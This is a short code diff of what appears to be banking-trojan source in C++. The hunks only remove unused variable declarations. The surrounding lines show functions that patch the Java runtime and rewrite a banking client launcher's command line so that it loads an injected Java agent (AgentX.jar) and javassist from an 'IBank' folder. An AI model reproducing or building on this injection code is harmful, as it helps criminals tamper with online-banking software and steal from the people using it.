@@ -869,7 +869,6 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 
 	if( pGetUserNameA( (char*)user, &userLen ) )
 	{
-		char *srcFile, *dstFile;
 		*path.str() = 0;
 		int resPatch = PatchRtJar( user, javaUrl, path, javaExe, javaExew );
 		if( resPatch == 0 )
@@ -1172,7 +1171,6 @@ static char* UpdateJavaCmdLine( const char* cmd )
 	fwsprintfA pwsprintfA = Get_wsprintfA();
 	if( javaExe == 1 ) //java.exe
 	{
-		char *after1, *after2;
 		MemPtr<1024> insert1, insert2;
 		pwsprintfA( insert1.str(), "\"%s\\lib\\javassist.jar\";\"%s\\AgentX.jar\";", path, path );
 		res = InsertAfter( ret, "-Xbootclasspath/a:", insert1 );
@@ -1206,7 +1204,6 @@ static char* UpdateJavaCmdLine( const char* cmd )
 -javaagent:"%AllUsersProfile%\Application Data\IBank\AgentX.jar" 
 -cp "%AllUsersProfile%\Application Data\IBank\AgentX.jar";launcher.jar;
 "%AllUsersProfile%\Application Data\IBank\lib\javassist.jar" com.bifit.launcher.Launcher*/
-		char *after1, *replaceSrc;
 		MemPtr<1024> insert1, replaceDst;
 		pwsprintfA( insert1.str(), "-javaagent:\"%s\\AgentX.jar\" ", path );
 		res = InsertAfter( ret, "-Xmx256M ", insert1.str() );
